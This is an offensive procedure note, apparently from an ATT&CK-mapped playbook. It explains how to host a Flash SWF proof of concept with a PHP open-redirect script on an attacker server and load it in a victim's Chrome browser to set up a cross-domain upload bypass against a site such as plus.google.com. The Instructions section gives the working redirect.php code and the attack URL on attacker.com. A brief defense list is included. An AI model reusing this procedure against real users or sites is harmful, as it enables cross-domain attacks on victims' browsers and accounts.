---
id: p2b2c3d4-e5f6-7890-abcd-ef1234567892
tags:
  - hosting
  - swf-load
  - redirect-url
type: procedure
tools:
  - '[[tools/PHP-Redirect-Server]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
  - Browser (Google Chrome)
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T05:32:09.981Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Host and Load SWF with Redirect URL

## Summary

This procedure hosts the SWF PoC on an attacker server and loads it in the victim's Chrome browser with a redirect URL targeting the victim site, preparing for the upload bypass.

## Description

The attacker hosts the SWF and a PHP redirect script on their server. The SWF is accessed via a URL that includes a parameter pointing to the redirect endpoint, which will forward to the target (e.g., plus.google.com). This step relies on user interaction to load the SWF in Chrome, where Flash will parse the URL without initial cross-domain enforcement.

## Requirements

1. Web server (e.g., Apache with PHP) for hosting
2. Compiled SWF file from previous procedure
3. Target victim site URL for redirection

## Defense

Defensive measures and detection strategies:

- Block or warn on Flash content loads from untrusted domains
- Use browser extensions to disable Flash or monitor redirects
- Log and alert on suspicious URL parameters in SWF loads

## Objectives

1. Successfully host SWF and redirect script
2. Load SWF in browser with target redirect
3. Verify URL parsing in Flash

## Instructions

### Step 1: Set Up Hosting

**Context**: Upload files to the server and configure the redirect.php.

No specific command; place files on server:

```php
// redirect.php
<?php
$target = $_GET['input'];
$status = isset($_GET['status']) ? $_GET['status'] : 307;
header("Location: " . $target, true, $status);
?>
```

> This script reads 'input' for target and 'status' for redirect code (default 307).

### Step 2: Load SWF in Browser

**Context**: Access the SWF URL to trigger loading.

Open in Chrome:

```url
http://attacker.com/chromeFileUploadCrossDomain.swf?url=redirect.php?input=https://plus.google.com/u/0/
```

> Browser loads SWF; Flash parses the URL parameter for upload.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/PHP-Redirect-Server]]

## Tags

- [[hosting]]
- [[swf-load]]
- [[redirect-url]]
